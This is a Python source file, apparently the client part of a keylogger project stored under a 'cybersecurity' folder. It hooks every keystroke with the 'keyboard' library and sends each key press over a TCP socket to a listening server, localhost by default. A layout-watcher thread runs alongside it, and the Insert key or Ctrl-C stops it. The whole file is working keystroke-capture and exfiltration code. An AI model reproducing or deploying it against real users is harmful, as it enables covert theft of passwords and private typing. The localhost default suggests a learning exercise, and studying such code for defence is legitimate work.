import socket
import time
import keyboard
import python.cybersecurity.keylogger.files.keylogger as keylogger
import signal
import threading
import sys
HOST = "127.0.0.1"
PORT = 65432
stop_flag = threading.Event()


def hook_loop(sock):
    def on_key(key):
        if stop_flag.is_set():
            return False
        if key.event_type == 'down':
            keylogger.send_key(sock, key)
    keyboard.hook(on_key)
    keyboard.wait("insert")


def start_client(host=HOST, port=PORT):
    global stop_flag

    def handle_sigint(sig, frame):
        print("\nShutting down the server")
        stop_flag.set()
        sys.exit(0)
    signal.signal(signal.SIGINT, handler=handle_sigint)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((host, port))
            print(f"Connected to {host}:{port}")
            layout_watch = threading.Thread(
                target=keylogger.layout_watcher,
                args=(stop_flag, ),
                daemon=True
                )
            layout_watch.start()
            t = threading.Thread(target=hook_loop, args=(s,))
            t.start()
            t.join()
        except ConnectionRefusedError:
            print(f"Failed to connect to the server: {host}:{port}")
        finally:
            stop_flag.set()
            time.sleep(0.1)
            print(f"Shutting down the client {host}:{port}")


if __name__ == "__main__":
    start_client()
